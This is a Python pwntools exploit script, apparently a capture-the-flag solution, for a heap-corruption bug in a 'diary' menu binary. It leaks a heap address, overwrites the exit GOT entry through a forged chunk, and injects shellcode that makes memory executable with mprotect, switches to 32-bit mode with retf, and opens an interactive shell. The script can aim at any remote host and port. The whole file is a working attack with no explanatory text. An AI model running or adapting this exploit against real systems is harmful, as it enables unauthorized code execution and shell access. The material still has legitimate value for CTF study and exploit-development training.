#!/usr/bin/env python

import sys

from pwn import *


def register(year, month, day, size, data, n):
    r.sendline('1')
    r.recvuntil(' ... ')
    r.sendline(str(year) + '/' + str(month) + '/' + str(day))
    msg = r.recv(14)
    if b'Wrong date ;(' in msg:
        r.recvuntil('>> ')
        return
    else:
        r.sendline(str(size))
        r.recvuntil(b'>> ')
        if n:
            r.sendline(data)
        else:
            r.send(data)
        r.recvuntil(b'>> ')


def show(year, month, day):
    r.sendline('2')
    r.recvuntil(b'Show entry\n')
    data = r.recvuntil(b'\nInput date ... ').strip(b'\nInput date ... ')
    r.sendline(str(year) + '/' + str(month) + '/' + str(day))
    r.recvline()
    data2 = r.recvuntil(b'\n\n').strip()
    r.recvuntil(b'>> ')
    return data, data2


def delete(year, month, day):
    r.sendline('3')
    r.recvuntil(b'Input date ... ')
    r.sendline(str(year) + '/' + str(month) + '/' + str(day))
    r.recvuntil(b'>> ')


def exploit(r):
    r.recvuntil(b'>> ')
    register(1980, 1, 1, 32, "C" * 32, 0)
    register(1980, 1, 2, 32, "C" * 32, 0)
    delete(1980, 1, 1)
    delete(1980, 1, 2)

    register(1980, 1, 3, 64, "\xeb\x7f" + "D" * 46, 0)
    d1, d2 = show(1980, 1, 3)
    heap = u64(d2[48:].ljust(8, b'\x00'))
    log.info("leak: " + hex(heap))

    sc = ('''
    xor rax, rax
    mov al, 9
    inc al
    mov rdi, 0x602000
    mov rsi, 0x1000
    mov rdx, 7
    syscall

    mov rax, 0
    xor rdi, rdi
    mov rsi, 0x602190
    mov rdx, 27
    syscall

    xor rsp, rsp
    mov esp, 0x602160
    mov DWORD PTR [esp+4], 0x23
    mov DWORD PTR [esp], 0x602190
    retf
    ''')

    payload = b"\x90" * 0x60
    payload += asm(sc, os='linux', arch='amd64') + b"\x00"

    register(1980, 1, 5, 0x100, payload, 0)

    e = ELF('diary')

    payload = p64(heap - 0x50)
    payload += p64(e.got['exit'] - 8)
    payload += b"C" * 8
    payload += b"D" * 8
    register(1970, 2, 2, 32, payload, 1)
    register(1970, 3, 3, 32, "B" * 32, 1)
    delete(1970, 2, 2)

    r.sendline('0')

    pause()
    r.sendline(asm(shellcraft.i386.linux.echo('./bash'), arch='x86'))

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./diary'])
        print(util.proc.pidof(r))
        pause()
        exploit(r)
